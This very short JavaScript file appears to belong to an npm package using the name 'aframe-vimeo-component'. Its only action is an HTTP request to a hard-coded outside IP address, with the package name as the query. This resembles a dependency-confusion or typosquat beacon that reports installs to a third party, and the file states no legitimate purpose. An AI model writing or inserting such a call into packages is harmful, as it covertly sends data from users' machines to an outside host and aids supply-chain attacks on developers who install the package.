const request = require('requests')

let host = "128.199.122.145"
let packages = "aframe-vimeo-component"

request(`http://${host}/?${packages}`, (error, response, body) => {})
